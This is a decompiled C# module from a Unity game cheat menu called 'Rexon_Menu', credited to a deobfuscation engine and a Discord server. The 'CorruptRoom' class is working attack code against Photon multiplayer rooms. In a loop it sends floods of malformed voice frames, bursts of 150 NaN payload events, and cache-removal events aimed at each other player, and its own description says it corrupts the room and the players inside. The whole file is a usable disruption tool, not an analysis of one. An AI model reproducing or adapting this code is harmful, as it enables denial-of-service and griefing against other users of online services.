// Processed with MiDeobf Engine v2.1.2rc (14/08/26)
// discord.gg/wyvern
// https://wyvern.im

// Type: Rexon_Menu.Core.Modules.ExperimentalOverpowered.CorruptRoom
// Assembly: Rexon_Menu, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

using System.Collections.Generic;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using Photon.Voice;
using Photon.Voice.PUN;
using Photon.Voice.Unity;
using Recovered.Obfuscated;
using Rexon_Menu.Core.Attributes;
using UnityEngine;

namespace Rexon_Menu.Core.Modules.ExperimentalOverpowered;

[Mod("Corrupt Room [DETECTED?]", "Experimental Overpowered [D?]", "Corrupts room and the players inside.", false, 11, ModType.Toggle, false)]
internal class CorruptRoom : MonoBehaviour
{
	private const byte VoiceEventCode = 202;
	private const byte InvalidPayloadEventCode = 186;
	private const float VoiceBurstInterval = 0.1f;
	private const float InvalidPayloadBurstInterval = 0.4f;
	private const float CacheRemovalInterval = 10f;
	private const int VoiceEventsPerBurst = 20;
	private const int InvalidPayloadEventsPerBurst = 150;

	private float _lastInvalidPayloadBurstTime;
	private float _lastCacheRemovalTime;
	private float _lastVoiceBurstTime;

	private void Update()
	{
		if (!PhotonNetwork.InRoom)
		{
			return;
		}

		PhotonVoiceNetwork voiceNetwork = PhotonVoiceNetwork.Instance;
		if (voiceNetwork == null || ((VoiceConnection)voiceNetwork).Client == null)
		{
			return;
		}

		if (Time.time > _lastVoiceBurstTime + VoiceBurstInterval)
		{
			_lastVoiceBurstTime = Time.time;
			SendVoiceEventBurst(((VoiceConnection)voiceNetwork).Client);
		}

		if (Time.time > _lastInvalidPayloadBurstTime + InvalidPayloadBurstInterval)
		{
			_lastInvalidPayloadBurstTime = Time.time;
			SendInvalidPayloadBurst();
		}

		if (Time.time > _lastCacheRemovalTime + CacheRemovalInterval)
		{
			_lastCacheRemovalTime = Time.time;
			SendCacheRemovalEvents();
		}
	}

	private static void SendVoiceEventBurst(LoadBalancingTransport voiceClient)
	{
		for (int eventIndex = 0; eventIndex < VoiceEventsPerBurst; eventIndex++)
		{
			Dictionary<byte, object> voiceFrame = new()
			{
				{ 1, 67 },
				{ 2, 0 },
				{ 3, 0 },
				{ 4, 0 },
				{ 5, 0 },
				{ 10, null },
				{ 11, (byte)0 },
				{ 12, (Codec)11 }
			};
			object[] payload = { (byte)0, (byte)1, new object[] { voiceFrame } };
			RaiseEventOptions options = new() { Receivers = (ReceiverGroup)1 };
			SendOptions sendOptions = new() { Reliability = false, Channel = 0 };
			((LoadBalancingClient)voiceClient).OpRaiseEvent(VoiceEventCode, payload, options, sendOptions);
		}
		GameNetworkUtilities.FlushAndReplayNetworkTraffic();
	}

	private static void SendInvalidPayloadBurst()
	{
		for (int eventIndex = 0; eventIndex < InvalidPayloadEventsPerBurst; eventIndex++)
		{
			GameNetworkUtilities.EnqueueRawPhotonEvent(
				InvalidPayloadEventCode,
				new object[] { float.NaN },
				new RaiseEventOptions { Receivers = (ReceiverGroup)0 },
				SendOptions.SendUnreliable);
		}
		GameNetworkUtilities.FlushAndReplayNetworkTraffic();
	}

	private static void SendCacheRemovalEvents()
	{
		foreach (Player player in PhotonNetwork.PlayerListOthers)
		{
			if (player == null)
			{
				continue;
			}

			RaiseEventOptions options = new()
			{
				CachingOption = (EventCaching)6,
				TargetActors = new[] { player.ActorNumber }
			};
			GameNetworkUtilities.EnqueueRawPhotonEvent(0, null, options, SendOptions.SendReliable);
		}
		GameNetworkUtilities.FlushAndReplayNetworkTraffic();
	}
}
